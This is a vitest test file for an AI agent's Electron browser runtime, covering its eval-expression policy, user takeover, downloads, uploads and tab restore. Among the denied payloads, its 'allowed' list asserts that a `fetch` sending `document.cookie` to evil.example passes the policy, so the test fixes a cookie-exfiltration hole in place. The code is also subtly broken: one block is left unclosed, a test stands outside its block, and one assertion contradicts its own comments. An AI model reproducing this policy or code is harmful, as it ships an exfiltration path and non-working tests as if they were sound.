import { describe, expect, it, vi, afterEach } from 'vitest'
import { mkdirSync, rmSync, writeFileSync, readdirSync } from 'node:fs'
import { join } from 'node:path'
import { BrowserRuntime } from '../src/runtime.ts'
import { BrowserGuard } from '../src/guard.ts'
import { BrowserStore } from '../src/store.ts'
import { validateEvalExpression, serializeEvalResult } from '../src/eval-policy.ts'
import type { ElectronAdapter, NativeBounds, NativeView } from '../src/electron-adapter.ts'
import type { CdpTransport } from '../src/cdp.ts'
import type { NativeDownloadItem, NativeSession } from '../src/electron-adapter.ts'

// ------------------------------------------------------------------ mocks

class MockTransport implements CdpTransport {
  attached = false
  handler: (method: string, params?: Record<string, unknown>) => unknown = () => ({})
  isAttached(): boolean { return this.attached }
  attach(): void { this.attached = true }
  detach(): void { this.attached = false }
  async sendCommand(method: string, params?: Record<string, unknown>) { return this.handler(method, params) }
  on(): unknown { return this }
  removeListener(): unknown { return this }
}

class MockSession implements NativeSession {
  handlers = new Map<string, Array<(...args: never[]) => void>>()
  clearStorageData = vi.fn(async () => {})
  clearCache = vi.fn(async () => {})
  setPermissionRequestHandler = vi.fn()
  setPermissionCheckHandler = vi.fn()
  on(event: string, listener: (...args: never[]) => void): void {
    const arr = this.handlers.get(event) ?? []
    arr.push(listener as never)
    this.handlers.set(event, arr)
  }
  removeListener(event: string, listener: (...args: never[]) => void): void {
    const arr = this.handlers.get(event) ?? []
    const i = arr.indexOf(listener as never)
    if (i >= 0) arr.splice(i, 1)
  }
}

class MockView implements NativeView {
  transport = new MockTransport()
  session = new MockSession()
  listeners = new Map<string, Array<(...args: unknown[]) => void>>()
  attached = false
  visible = false
  bounds: NativeBounds = { x: 0, y: 0, width: 0, height: 0 }
  url = ''
  title = ''
  loading = false
  destroyed = false
  partition = 'persist:agent-browser-test'
  loadURL = vi.fn(async (u: string) => { this.url = u; this.title = `Title of ${u}`; this.emit('did-stop-loading') })
  downloadURL = vi.fn()
  goBack = vi.fn(() => { this.url = 'about:blank'; this.emit('did-finish-load') })
  goForward = vi.fn(() => { this.emit('did-finish-load') })
  reload = vi.fn(() => { this.emit('did-finish-load') })
  canGoBack = vi.fn(() => false)
  canGoForward = vi.fn(() => false)
  capturePage = vi.fn(async () => ({ getSize: () => ({ width: 100, height: 100 }), resize: (o: unknown) => o, toJPEG: () => Buffer.from('x') }) as never)
  setWindowOpenHandler = vi.fn()
  attach(win: { contentView: { addChildView: (v: unknown) => void } }, bounds: NativeBounds): void { this.attached = true; this.bounds = bounds; win.contentView.addChildView(this) }
  setBounds(b: NativeBounds): void { this.bounds = b }
  setVisible(v: boolean): void { this.visible = v }
  detach(): void { this.attached = false }
  moveToTop(): void {}
  destroy(): void { this.destroyed = true }
  emit(event: string, ...args: unknown[]): void {
    for (const l of [...(this.listeners.get(event) ?? [])]) l(...args)
  }
  get webContents(): never {
    return {
      cdp: this.transport,
      loadURL: this.loadURL,
      downloadURL: this.downloadURL,
      goBack: this.goBack,
      goForward: this.goForward,
      reload: this.reload,
      canGoBack: this.canGoBack,
      canGoForward: this.canGoForward,
      capturePage: this.capturePage,
      getURL: () => this.url,
      getTitle: () => this.title,
      isLoading: () => this.loading,
      on: (e: string, l: (...a: unknown[]) => void) => { this.listeners.set(e, [...(this.listeners.get(e) ?? []), l]) },
      removeListener: (e: string, l: (...a: unknown[]) => void) => { this.listeners.set(e, (this.listeners.get(e) ?? []).filter((x) => x !== l)) },
      session: this.session,
      setWindowOpenHandler: () => {},
      close: () => { this.destroyed = true },
      isDestroyed: () => this.destroyed,
    } as never
  }
}

class MockAdapter implements ElectronAdapter {
  views: MockView[] = []
  overlays: MockView[] = []
  windows: Array<{ visible: boolean; destroyed: boolean }> = []
  showSaveDialog: never
  openPath = vi.fn(async () => ({}))
  createView(): NativeView { const v = new MockView(); this.views.push(v); return v }
  createMaskView(): NativeView { const v = new MockView(); this.overlays.push(v); return v }
  createBrowserWindow(): never {
    const w = { visible: false, destroyed: false, title: '' }
    this.windows.push(w as never)
    return {
      loadURL: async () => {},
      show: () => { w.visible = true },
      hide: () => {},
      focus: () => {},
      isVisible: () => w.visible,
      isDestroyed: () => w.destroyed,
      close: () => { w.destroyed = true },
      setTitle: (t: string) => { w.title = t },
      getContentSize: () => ({ width: 1100, height: 780 }),
      contentView: { addChildView: () => {}, removeChildView: () => {} },
      onResize: () => () => {},
      onClosed: () => () => {},
      focusPage: () => {},
    } as never
  }
  lastView(): MockView { return this.views.at(-1)! }
}

function makeRuntime(): { runtime: BrowserRuntime; adapter: MockAdapter; store: BrowserStore; cleanup: () => void } {
  const adapter = new MockAdapter()
  const dir = join(process.cwd(), 'tests', `.af-store-${Math.random().toString(36).slice(2)}`)
  mkdirSync(dir, { recursive: true })
  const store = new BrowserStore({ dir })
  const runtime = new BrowserRuntime(adapter as never, {}, undefined, undefined, { store })
  const cleanup = () => { runtime.dispose(); rmSync(dir, { recursive: true, force: true }) }
  return { runtime, adapter, store, cleanup }
}

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms))

// Stale per-test store dirs must never linger (a failing assertion could skip
// cleanup): sweep them after every test.
afterEach(() => {
  const dir = join(process.cwd(), 'tests')
  try {
    for (const name of readdirSync(dir)) {
      if (name.startsWith('.af-store')) rmSync(join(dir, name), { recursive: true, force: true })
    }
  } catch { /* best effort */ }
})

// --------------------------------------------------------------- eval policy

describe('audit fixes: eval policy computed-member hardening', () => {
  it('rejects string-literal computed calls of write APIs', () => {
    const denied = [
      `globalThis['eval']('alert(1)')`,
      `document['write']('<h1>x</h1>')`,
      `location['assign']('https://evil.example')`,
      `window['open']('https://evil.example')`,
      `localStorage['setItem']('a','b')`,
      `document['cookie'] = 'x=1'`,
    ]
    for (const expr of denied) expect(() => validateEvalExpression(expr), expr).toThrow()
  })
  it('still rejects non-literal computed and sequence call targets (deny-by-default)', () => {
    // fetch is now allowed, but a DYNAMIC call target remains unverifiable —
    // the dynamic-target rule is unchanged (network calls must use a fixed name).
    for (const expr of [`window[key]('x')`, `(0, fetch)('https://evil.example')`, `[fetch][0]('x')`, `(true ? fetch : fetch)('x')`]) {
      expect(() => validateEvalExpression(expr), expr).toThrow()
    }
  })
  it('rejects in-place mutation / reflection / navigation side-effect APIs', () => {
    const denied = [
      `[1,2,3].push(4)`,
      `document.title && [1].sort()`,
      `Object.defineProperty(window, 'x', { value: 1 })`,
      `Object.setPrototypeOf({}, null)`,
      `Reflect.set(window, 'x', 1)`,
      `Reflect.deleteProperty(window, 'x')`,
      `history.back()`,
      `history.go(-1)`,
      `location.replace('https://evil.example')`,
      `document.querySelector('form').requestSubmit()`,
      `document.querySelector('form').reset()`,
      `document.querySelector('video').play()`,
      `window.close()`,
    ]
    for (const expr of denied) expect(() => validateEvalExpression(expr), expr).toThrow()
  })
  it('still allows read-only computed access (SSR globals / data keys)', () => {
    const allowed = [
      `window['__NEXT_DATA__']`,
      `({a:1})['a']`,
      `[1,2,3][0]`,
      `(x => x * 2)(21)`,
      `document.querySelector('script') && true`,
      `localStorage.getItem('k')`,
      `window['fetch']('https://evil.example/?c=' + document.cookie)`, // fetch is now allowed (2026-09-08)
      `fetch('https://evil.example')`,
    ]
    for (const expr of allowed) expect(() => validateEvalExpression(expr), expr).not.toThrow()
  })
})

// ---------------------------------------------------------- open/user gate

describe('audit fixes: browser_open joins the user gate + busy', () => {
  it('agent open waits while the user controls the browser (release resumes)', async () => {
    const { runtime, cleanup } = makeRuntime()
    runtime.setUserControl(true, 'user')
    let opened = false
    const p = runtime.open('https://a.example').then(() => { opened = true })
    await sleep(80)
    expect(opened).toBe(false)
    runtime.setUserControl(false, 'user')
    await p
    expect(opened).toBe(true)
    cleanup()
  })
  it('agent open marks the pool busy and the overlay as mask', async () => {
    const { runtime, adapter, cleanup } = makeRuntime()
    const p = runtime.open('https://a.example')
    expect(runtime.isBusy).toBe(true)
    await p
    expect(runtime.isBusy).toBe(false)
    const overlay = adapter.overlays.at(-1)
    // capsule bounds after idle; mask bounds would equal the content area
    expect(overlay?.bounds.y).toBeGreaterThanOrEqual(0)
    cleanup()
  })
})

// ------------------------------------------------------- download dedupe

describe('audit fixes: download guard idempotence', () => {
  it('installs one will-download listener per session', () => {
    const session = new MockSession()
    const guard = new BrowserGuard({} as never)
    const records: string[] = []
    const recorder = { add: (e: { url: string }) => { records.push(e.url); return records.length }, update: () => {} }
    guard.installDownloadGuard(session, () => {}, recorder)
    guard.installDownloadGuard(session, () => {}, recorder)
    expect((session.handlers.get('will-download') ?? []).length).toBe(1)
    const item = { getURL: () => 'https://x/y.bin', getFilename: () => 'y.bin', getTotalBytes: () => 5, getReceivedBytes: () => 0, setSavePath: () => {}, cancel: () => {}, on: () => {} } as unknown as NativeDownloadItem
    for (const l of session.handlers.get('will-download') ?? []) (l as (e: unknown, i: NativeDownloadItem) => void)({}, item)
    expect(records.length).toBe(1)
  })
})

// ---------------------------------------------------------- wait_for exprs

describe('audit fixes: wait_for conditions', () => {
  it('url-change compares against the captured start URL (not constant-true)', () => {
    const expr = BrowserRuntime.waitExpression({ condition: 'url-change' }, 'https://start.example/')
    expect(expr).toContain('location.href !== "https://start.example/"')
    // the old constant-true form must be gone
    expect(expr).not.toContain('length > 0')
  })
  it('network-idle checks resource timing (not constant-true)', () => {
    const expr = BrowserRuntime.waitExpression({ condition: 'network-idle' })
    expect(expr).toContain('responseEnd')
    expect(expr).not.toContain('|| true')
  })
})

// --------------------------------------------------------- ledger restore

describe('audit fixes: ledger restore materializes views lazily', () => {
  it('restore does NOT pop the window at boot; showWindow materializes views', async () => {
    const { runtime, store, cleanup } = makeRuntime()
    await runtime.open('https://a.example')
    await runtime.open('https://b.example')
    runtime.saveLedger()
    const adapter2 = new MockAdapter()
    const runtime2 = new BrowserRuntime(adapter2 as never, {}, undefined, undefined, { store })
    runtime2.restoreLedger()
    await sleep(30)
    // Lazy restore: registry meta only, no window, no views yet.
    expect(runtime2.pool.list().length).toBe(2)
    expect(runtime2.listTabs().length).toBe(0)
    expect(adapter2.windows.length).toBe(0)
    // First browser use materializes views + window.
    await runtime2.showWindow()
    await sleep(60)
    expect(runtime2.listTabs().length).toBe(2)
    expect(adapter2.windows.length).toBe(1)
    // Close one restored tab: no zombie — registry entry drops too.
    await runtime2.closeTab(1, true)
    expect(runtime2.pool.list().length).toBe(1)
    expect(runtime2.listTabs().length).toBe(1)
    cleanup()
    runtime2.dispose()
  })
  it('a second restore/materialize call is idempotent', async () => {
    const { runtime, store, cleanup } = makeRuntime()
    await runtime.open('https://a.example')
    runtime.saveLedger()
    const runtime2 = new BrowserRuntime(new MockAdapter() as never, {}, undefined, undefined, { store })
    runtime2.restoreLedger()
    runtime2.materializePendingTabs()
    await sleep(20)
    runtime2.materializePendingTabs()
    await sleep(60)
    expect(runtime2.listTabs().length).toBe(1)
    cleanup()
    runtime2.dispose()
  })
})

// ------------------------------------------------------- upload whitelist

describe('audit fixes: upload_file path whitelist', () => {
  it('rejects paths outside the allowed directories', async () => {
    const { runtime, cleanup } = makeRuntime()
    await runtime.open('https://a.example')
    const tab = runtime.currentTabId()!
    const allowed = join(process.cwd(), 'tests')
    const bad = await runtime.uploadFile(tab, ['/etc/passwd'], undefined, [allowed]).catch((e: unknown) => e)
    expect((bad as { code?: string }).code).toBe('policy')
    cleanup()
  })
  it('accepts paths inside the allowed directories', async () => {
    const { runtime, adapter, cleanup } = makeRuntime()
    await runtime.open('https://a.example')
    const tab = runtime.currentTabId()!
    const allowed = join(process.cwd(), 'tests')
    const file = join(allowed, 'af-upload-fixture.txt')
    writeFileSync(file, 'x')
    adapter.lastView().transport.handler = (method) => {
      if (method === 'DOM.getDocument') return { root: { nodeId: 1 } }
      if (method === 'DOM.querySelector') return { nodeId: 2 }
      return {}
    }
    const ok = await runtime.uploadFile(tab, [file], undefined, [allowed])
    expect(ok.uploaded).toBe(1)
    rmSync(file, { force: true })
    cleanup()
  })
})

// ------------------------------------------------------------- actor + store

describe('audit fixes: op-log actor + store switching', () => {
  it('user-path ops are recorded with actor user; agent ops with ai', async () => {
    const { runtime, cleanup } = makeRuntime()
    await runtime.open('https://a.example', undefined, false) // agent path
    await runtime.open('https://b.example', undefined, true) // user path
    const opens = runtime.opLog.filter((o) => o.tool === 'browser_open')
    expect(opens[0]?.actor).toBe('user')
    expect(opens[1]?.actor).toBe('ai')
    cleanup()
  })
  it('setStore re-points the ledger file', async () => {
    const { runtime, store, cleanup } = makeRuntime()
    await runtime.open('https://a.example')
    runtime.saveLedger()
    const dir2 = join(process.cwd(), 'tests', `.af-store2-${Math.random().toString(36).slice(2)}`)
    const store2 = new BrowserStore({ dir: dir2 })
    runtime.setStore(store2)
    runtime.saveLedger()
    expect(store2.getGroupLedger()).toBeDefined()
    rmSync(dir2, { recursive: true, force: true })
    cleanup()
  })
  it('no-op takeover/release is not double-recorded', async () => {
    const { runtime, cleanup } = makeRuntime()
    runtime.setUserControl(true, 'user')
    runtime.setUserControl(true, 'user') // no-op — no extra op
    const takeovers = runtime.opLog.filter((o) => o.tool === 'browser_takeover')
    expect(takeovers.length).toBe(1)
    runtime.setUserControl(false, 'user')
    runtime.setUserControl(false, 'user') // no-op
    const releases = runtime.opLog.filter((o) => o.tool === 'browser_release')
    expect(releases.length).toBe(1)
    cleanup()
  })
  it('downloadUrl refuses non-http(s) schemes', async () => {
    const { runtime, cleanup } = makeRuntime()
    await runtime.open('https://a.example')
    const err = await runtime.downloadUrl('file:///etc/passwd').catch((e: unknown) => e)
    expect((err as { code?: string }).code).toBe('navigation-blocked')
    const err2 = await runtime.downloadUrl('javascript:alert(1)').catch((e: unknown) => e)
    expect((err2 as { code?: string }).code).toBe('navigation-blocked')
    cleanup()
  })

// ------------------------------------------------- always-on mask

describe('audit fixes: always-on mask (我来操作 is the only entry)', () => {
  it('mask is the default state; only takeover unlocks; release re-arms', async () => {
    const { runtime, adapter, cleanup } = makeRuntime()
    await runtime.open('https://a.example')
    // Idle + not controlled => mask (locked), covering the FULL window.
    let state = runtime.shellState()
    expect(state.ui.mode).toBe('mask')
    let overlay = adapter.overlays.at(-1)!
    expect(overlay.bounds).toEqual({ x: 0, y: 0, width: 1100, height: 780 })
    // Takeover unlocks (capsule).
    runtime.setUserControl(true, 'user')
    state = runtime.shellState()
    expect(state.ui.mode).toBe('capsule')
    // Release re-arms the mask immediately — even while idle.
    runtime.setUserControl(false, 'user')
    state = runtime.shellState()
    expect(state.ui.mode).toBe('mask')
    overlay = adapter.overlays.at(-1)!
    expect(overlay.bounds).toEqual({ x: 0, y: 0, width: 1100, height: 780 })
    cleanup()
  })
  it('busy does not change the lock (mask while idle AND busy)', async () => {
    const { runtime, cleanup } = makeRuntime()
    await runtime.open('https://a.example')
    const id = runtime.currentTabId()!
    const p = runtime.waitFor(id, { condition: 'element-present', selector: '#zzz', timeoutMs: 200 })
    // during waitFor the pool is busy
    await sleep(30)
    expect(runtime.shellState().ui.mode).toBe('mask')
    runtime.setUserControl(true, 'user')
    expect(runtime.shellState().ui.mode).toBe('capsule')
    runtime.setUserControl(false, 'user')
    expect(runtime.shellState().ui.mode).toBe('mask')
    await p
    cleanup()
  })
})

// ------------------------------------------------- round-3 UX state

describe('audit fixes: round-3 UX state (favicon/history buttons/window title)', () => {
  it('exposes favicon + history flags in tab state (page-favicon-updated)', async () => {
    const { runtime, adapter, cleanup } = makeRuntime()
    await runtime.open('https://a.example')
    const id = runtime.currentTabId()!
    const view = adapter.lastView()
    view.canGoBack = vi.fn(() => true)
    view.emit('page-favicon-updated', {}, ['https://a.example/favicon.ico'])
    view.emit('did-navigate')
    const state = runtime.tabState(id)
    expect(state.favicon).toBe('https://a.example/favicon.ico')
    expect(state.canGoBack).toBe(true)
    expect(state.canGoForward).toBe(false)
    cleanup()
  })
  it('window title follows the active tab page title', async () => {
    const { runtime, adapter, cleanup } = makeRuntime()
    await runtime.open('https://a.example')
    const win = adapter.windows[0] as unknown as { title: string }
    expect(win.title).toContain('Title of https://a.example')
    cleanup()
  })
  it('openDownloadPath opens finished files and rejects missing ones', async () => {
    const { runtime, adapter, cleanup } = makeRuntime()
    const entry = runtime.store.addDownload({
      url: 'https://x/y.zip', fileName: 'y.zip', path: '/tmp/y.zip', size: 1, actor: 'ai', group: '',
    })
    const ok = await runtime.openDownloadPath(entry.id)
    expect(ok.ok).toBe(true)
    expect(adapter.openPath).toHaveBeenCalledWith('/tmp/y.zip')
    const err = await runtime.openDownloadPath(999999).catch((e: unknown) => e)
    expect((err as { code?: string }).code).toBe('not-found')
    cleanup()
  })
})
  it('serializeEvalResult masks secrets and caps size (regression)', () => {
    const out = serializeEvalResult({ token: 'abcdef123456', ok: 1 })
    expect(out).toContain('****')
    expect(out).toContain('ok')
  })
})
